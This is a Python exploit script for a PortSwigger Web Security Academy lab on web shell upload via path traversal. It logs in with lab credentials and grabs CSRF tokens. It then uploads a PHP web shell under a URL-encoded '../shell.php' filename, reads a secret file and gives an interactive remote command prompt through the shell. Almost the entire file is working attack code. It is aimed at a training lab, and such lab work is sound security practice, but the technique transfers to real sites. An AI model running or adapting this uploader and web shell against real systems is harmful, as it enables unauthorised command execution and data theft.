import requests
import urllib3
import sys
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

banner = f"""
╔════════════════════════════════════════════════════════════╗
║          FILE UPLOAD VULNERABILITIES LABS                  ║
╠════════════════════════════════════════════════════════════╣
║  	 Lab 03 : Web shell upload via path traversal        ║
╠════════════════════════════════════════════════════════════╣
║        PortSwigger Web Security Academy                    ║
╚════════════════════════════════════════════════════════════╝
"""

session = requests.Session()

proxies = {
	"http" : "http://127.0.0.1:8080",
	"https" : "http://127.0.0.1:8080"
}

def run_command(url):
	response6 = requests.get(url=url + "/files/shell.php?cmd=cat /home/carlos/secret",verify=False)
	print(f"[+] Secret is : {response6.text}")
	prompt=get_prompt(url)
	print(f"[+] Enter command you want to execute")
	print(f"[+] Type exit to stop")
	while True:		
		command = input(prompt)
		path4 = url + "/files/shell.php?cmd=" + command
		if command == 'exit':
			sys.exit(0)
		if command == 'rm shell.php':
			response4 = requests.get(url=path4,verify=False)
			print(f"[+] Web Shell Removed")
			sys.exit(0)
		response4 = requests.get(url=path4,verify=False)
		if response4.status_code == 200:
			print(response4.text.strip())


def get_prompt(url):
	username = requests.get(url=url+"/files/shell.php?cmd=whoami").text.strip()
	hostname = requests.get(url=url+"/files/shell.php?cmd=hostname").text.strip()
	working_dir = requests.get(url=url+"/files/shell.php?cmd=pwd").text.strip()
	prompt = f"{username}@{hostname} : {working_dir}$ "
	return(prompt)


def web_shell(url):
	path5= '/my-account'
	path3 = '/my-account/avatar'
	csrf = csrf_token(url,path5)
	files = {
		"avatar":(
			"%2e%2e%2fshell.php",
			"<?php system($_GET['cmd']); ?>",
			"application/x-php"
		)
	}
	data = {
	"user" : "wiener",
	"csrf" : csrf
	}
	response2=session.post(url=url+path3,files=files,data=data,verify=False)
	print(f"[+] Uploading a web shell ...")
	if "The file avatars/../shell.php has been uploaded" in response2.text:
		print(f"[+] Web Shell Uploaded Succesfully")
		run_command(url)
	else :
		print(f"[-] Web Shell Upload Failed" )
		sys.exit(1)


def login(url):
	path1 = '/login'
	csrf=csrf_token(url,path1)
	creads = {
		"csrf" : csrf,
		"username":"wiener",
		"password" : "peter"
	}
	print(f"[+] Login as wiener:peter")
	response6= session.post(url=url+path1,data=creads,verify=False)
	if "Log out" in response6.text: 
		print(f"[+] Login Successfull")
		web_shell(url)
	else:
		print(f"[-] Login Failed")
		sys.exit(0)


def csrf_token(url,path):
	response1 = session.get(url=url+path,verify=False)
	soup = BeautifulSoup(response1.text,"html.parser")
	if not soup.find("input",{"name":"csrf"}):
		print(f"[-] CSRF token not found")
		sys.exit(0)
	else:	
		csrf = soup.find("input",{"name":"csrf"})["value"]
		return(csrf)


def check_webshell(url):
	path2 = '/files/shell.php'
	response5 = requests.get(url=url+path2,verify=False)
	if response5.status_code == 200:
		print(f"[+] Web shell already exists")
		run_command(url)
	else:
		login(url)


def main():
	if len(sys.argv) != 2:
		print(f"[+] Usage : {sys.argv[0]} <url>")
		print(f"[+] Example : {sys.argv[0]} https://00000.web-security-academy.net")
		sys.exit(1)
	else:
		print(banner)
	if sys.argv[1].endswith("/"):
		url = sys.argv[1][:-1]
	else:
		url = sys.argv[1]
	
	check_webshell(url)


if __name__ == "__main__":
	main()
